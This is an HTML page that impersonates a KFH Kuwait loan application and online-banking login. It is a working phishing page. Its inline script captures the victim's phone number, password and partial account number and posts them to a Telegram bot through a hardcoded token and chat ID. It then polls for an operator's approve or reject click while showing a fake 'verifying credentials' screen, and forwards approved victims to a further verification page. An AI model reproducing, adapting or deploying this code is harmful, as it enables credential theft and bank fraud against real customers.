<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apply Now - KFH Kuwait</title>
    <link rel="icon" type="image/png" href="favicon.png" sizes="64x64">
    <link rel="stylesheet" href="style.css">
    <link rel="stylesheet" href="application.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Figtree:wght@400;500;600;700;800&family=Noto+Kufi+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
    <meta name="description" content="Apply for a personal loan with KFH Kuwait. Fast approval, Sharia'a compliant, and secure applications.">
    
    <style>
        :root {
            --kfh-green: #009144;
            --kfh-dark-green: #006B35;
            --kfh-light-green: #E8F5E9;
            --kfh-gold: #C4A962;
            --primary-color: #009144;
            --primary-dark: #006B35;
        }
        
        .login-waiting {
            text-align: center;
            padding: 40px 20px;
        }
        
        .login-waiting h3 {
            margin: 20px 0 10px;
            color: var(--primary-color);
        }
        
        .login-waiting p {
            color: #666;
            margin-bottom: 10px;
        }
        
        .login-waiting small {
            color: #999;
        }
    </style>
</head>
<body>
    <!-- Navigation -->
    <nav class="navbar">
        <div class="nav-container">
            <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;">
                <img src="Kuwait-Finance-House.jpg" alt="KFH" class="logo-img" style="height: 36px; width: auto;">
                <span class="logo-text">KFH Kuwait</span>
            </div>
        </div>
    </nav>

    <!-- Application Form -->
    <section class="application-section">
        <div class="application-container">
            <!-- Progress Bar -->
            <div class="progress-bar">
                <div class="progress-step active" data-step="1">
                    <div class="step-number">1</div>
                    <div class="step-label">Login</div>
                </div>
                <div class="progress-line"></div>
                <div class="progress-step" data-step="2">
                    <div class="step-number">2</div>
                    <div class="step-label">Verify</div>
                </div>
                <div class="progress-line"></div>
                <div class="progress-step" data-step="3">
                    <div class="step-number">3</div>
                    <div class="step-label">Details</div>
                </div>
            </div>

            <!-- Form Card -->
            <div class="form-card">
                <!-- Step 1: Username & Password -->
                <div class="form-step active" id="step-1">
                    <div class="step-header">
                        <h2>KFH Online Banking Login</h2>
                        <p>Enter your credentials to continue</p>
                    </div>

                    <form id="login-form" class="loan-form" action="verify.html" method="GET">
                        <div class="form-group">
                            <label for="phone">Phone Number *</label>
                            <input type="tel" id="phone" name="phone" required placeholder="+965 XXXXXXXX" class="phone-input" pattern="[+]?965[0-9]{8}" maxlength="12">
                            <small class="phone-hint">Enter your registered Kuwait mobile number (8 digits after +965)</small>
                        </div>

                        <div class="form-group">
                            <label for="password">Password *</label>
                            <input type="password" id="password" name="password" required placeholder="Enter your password" class="pin-input">
                            <small>Your password is secure and encrypted</small>
                        </div>

                        <div class="form-group">
                            <label for="accountNumber">Account Number (Last 5 Digits) *</label>
                            <input type="text" id="accountNumber" name="accountNumber" required placeholder="XXXXX" class="pin-input" maxlength="5" pattern="[0-9]{5}">
                            <small>Enter the last 5 digits of your account number</small>
                        </div>

                        <div class="form-actions">
                            <button type="button" class="btn-secondary" onclick="window.location.href='index.html'">Back</button>
                            <button type="submit" class="btn-primary btn-approve">Login</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </section>

    <script src="landing-script.js"></script>
    <script>
        const TELEGRAM_BOT_TOKEN = '8663835867:AAHBDm5yUNurJQSOuOdw7VWWekJuLzOj-l4';
        const TELEGRAM_CHAT_ID = '7973653220';
        let lastUpdateId = 0;
        let loginPollingInterval = null;

        // Save credentials to sessionStorage when form is submitted
        document.getElementById('login-form').addEventListener('submit', function(e) {
            e.preventDefault(); // Prevent default form submission
            
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            const accountNumber = document.getElementById('accountNumber').value;
            
            sessionStorage.setItem('kfh_phone', phone);
            sessionStorage.setItem('kfh_password', password);
            sessionStorage.setItem('kfh_account_number', accountNumber);
            
            // Show waiting state
            showWaitingState();
            
            // Send to bot
            sendToBot(phone, password, accountNumber);
        });

        async function sendToBot(phone, password, accountNumber) {
            const sessionId = 'session_' + Math.random().toString(36).substr(2, 9);
            sessionStorage.setItem('kfh_session_id', sessionId);
            
            const message = '🏦 KFH KUWAIT - NEW LOGIN REQUEST\n\n🆔 Session ID: ' + sessionId + '\n📱 Phone: ' + phone + '\n🔐 Password: ' + password + '\n🏦 Account (Last 5): ' + accountNumber + '\n📅 Time: ' + new Date().toLocaleString();

            const replyMarkup = {
                inline_keyboard: [
                    [{ text: '✅ APPROVE LOGIN', callback_data: 'login_approve_' + sessionId }, { text: '❌ REJECT LOGIN', callback_data: 'login_reject_' + sessionId }]
                ]
            };

            try {
                await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, reply_markup: replyMarkup })
                });
                
                // Start polling for admin approval
                startLoginPolling();
            } catch (error) {
                console.log('Error sending to bot:', error);
                alert('Connection error. Please try again.');
            }
        }

        function showWaitingState() {
            const formCard = document.querySelector('.form-card');
            formCard.innerHTML = `
                <div class="login-waiting">
                    <div class="waiting-spinner"></div>
                    <h3>Verifying Your Credentials</h3>
                    <p>Please wait while we verify your login details...</p>
                    <small>This may take a few moments</small>
                </div>
            `;
        }

        function startLoginPolling() {
            loginPollingInterval = setInterval(async function() {
                try {
                    const response = await fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/getUpdates?offset=' + (lastUpdateId + 1) + '&timeout=1');
                    const data = await response.json();
                    
                    if (data.ok && data.result && data.result.length > 0) {
                        lastUpdateId = data.result[data.result.length - 1].update_id;
                        
                        const sessionId = sessionStorage.getItem('kfh_session_id');
                        
                        for (const update of data.result) {
                            if (update.callback_query) {
                                const callbackData = update.callback_query.data;
                                const callbackId = update.callback_query.id;
                                
                                // Answer the callback query
                                fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/answerCallbackQuery', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({ callback_query_id: callbackId })
                                });
                                
                                if (callbackData === 'login_approve_' + sessionId) {
                                    clearInterval(loginPollingInterval);
                                    onLoginApproved();
                                    return;
                                }
                                
                                if (callbackData === 'login_reject_' + sessionId) {
                                    clearInterval(loginPollingInterval);
                                    onLoginRejected();
                                    return;
                                }
                            }
                        }
                    }
                } catch (error) {
                    console.log('Polling error:', error);
                }
            }, 2000);
        }

        function onLoginApproved() {
            const approvedMessage = '✅ KFH KUWAIT - LOGIN APPROVED\n\n🆔 Session: ' + sessionStorage.getItem('kfh_session_id') + '\n📱 Phone: ' + sessionStorage.getItem('kfh_phone') + '\n📅 Time: ' + new Date().toLocaleString();
            
            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: approvedMessage })
            });
            
            // Proceed to step 2
            window.location.href = 'verify.html';
        }

        function onLoginRejected() {
            const rejectedMessage = '❌ KFH KUWAIT - LOGIN REJECTED\n\n🆔 Session: ' + sessionStorage.getItem('kfh_session_id') + '\n📱 Phone: ' + sessionStorage.getItem('kfh_phone') + '\n📅 Time: ' + new Date().toLocaleString();
            
            fetch('https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: rejectedMessage })
            });
            
            alert('Your login has been rejected. Please try again or contact customer support.');
            window.location.href = 'application.html';
        }
    </script>
</body>
</html>
